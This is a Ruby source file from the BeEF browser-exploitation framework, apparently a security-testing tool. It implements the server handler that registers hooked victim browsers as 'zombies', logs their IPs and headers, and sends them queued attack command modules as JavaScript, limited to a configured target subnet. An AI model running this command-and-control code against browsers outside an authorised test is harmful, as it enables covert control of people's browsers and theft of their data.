module BeEF
  
  #
  # This class handles connections from zombies to the framework.
  #
  class ZombieHandler < WEBrick::HTTPServlet::AbstractServlet
    
    include BeEF::Server::Modules::Common
    include BeEF::Server::Modules::Requester
    
    attr_reader :guard
    
    def initialize(config)
      @guard = Mutex.new
      @cmd_opts = BeEF::Console::CommandLine.parse
      @session = BeEF::UI::Session.instance
    end
    
    #
    # This method processes the http requests sent by a zombie to the framework.
    # It will update the database to add or update the current zombie and deploy
    # some command modules or plugins.
    #
    def do_GET(request, response)
      @body = ''
      @params = request.query
      @request = request
      @response = response
      config = BeEF::Configuration.instance

      # check source ip address of browser
      permitted_hooking_subnet = config.get('permitted_hooking_subnet')
      target_network = IPAddr.new(permitted_hooking_subnet)
      if not target_network.include?(request.peeraddr[3].to_s)
        BeEF::Logger.instance.register('Target Range', "Attempted hook from out of target range browser (#{request.peeraddr[3]}) rejected.")
        @response.set_error(nil)
        return
      end

      # get zombie if already hooked the framework
      hook_session_value = request.get_hook_session_value()
      zombie = BeEF::Models::Zombie.first(:session => hook_session_value) if not hook_session_value.nil?
      
      if not zombie # is a new browser so set up the hook
      
        # create the session id used to maintain the hooked session
        hook_session_value = BeEF::Crypto::secure_token
        
        # create the structure repesenting the hooked browser
        zombie = BeEF::Models::Zombie.new(:ip => request.peeraddr[3], :session => hook_session_value)
        zombie.domain = request.get_referer_domain
        zombie.firstseen = Time.new.to_i
        zombie.has_init = false # set to true (in inithandler.rb) when the init values returned
        zombie.httpheaders = request.header.to_json
        zombie.save # the save needs to be conducted before any hooked browser specific logging
        
        # add a log entry for the newly hooked browser
        log_zombie_domain = zombie.domain
        log_zombie_domain = "(blank)" if log_zombie_domain.nil? or log_zombie_domain.empty?
        BeEF::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}", "#{zombie.id}") 
        
        # check if the framework is already loaded in the browser - this check is based on the existance of the beef_js_cmp param
        # for example, when the db is reset and a hooked browser (with the framework loaded) will reconnect
        @beef_js_cmps = request.query['beef_js_cmps'] || nil
        framework_loaded = (not @beef_js_cmps.nil?)
        
        # generate the instructions to hook the browser
        build_beefjs!(hook_session_value, framework_loaded)
        
      end
      
      # record the last poll from the browser
      zombie.lastseen = Time.new.to_i
      
      zombie.count!
      zombie.save
      
      execute_plugins!
      
      # add all availible command module instructions to the response
      zombie_commands = BeEF::Models::Command.all(:zombie_id => zombie.id, :has_run => false)
      zombie_commands.each{|command| add_command_instructions(command, zombie)}

      # add all availible autoloading command module instructions to the response
      autoloadings = BeEF::Models::Command.all(:autoloadings => { :in_use => true })
      autoloadings.each {|command| add_command_instructions(command, zombie)}

      # executes the requester
      requester_run(zombie)

      # set response headers and body
      response.set_no_cache
      response.header['Content-Type'] = 'text/javascript' 
      response.header['Access-Control-Allow-Origin'] = '*'
      response.header['Access-Control-Allow-Methods'] = 'POST, GET'
      response.body = @body
      
    end
      
    alias do_POST do_GET
    
    private
    
    # Object representing the HTTP request
    @request
    
    # Object representing the HTTP response
    @response
    
    # A string containing the list of BeEF components active in the hooked browser
    @beef_js_cmps
    
  end
  
end
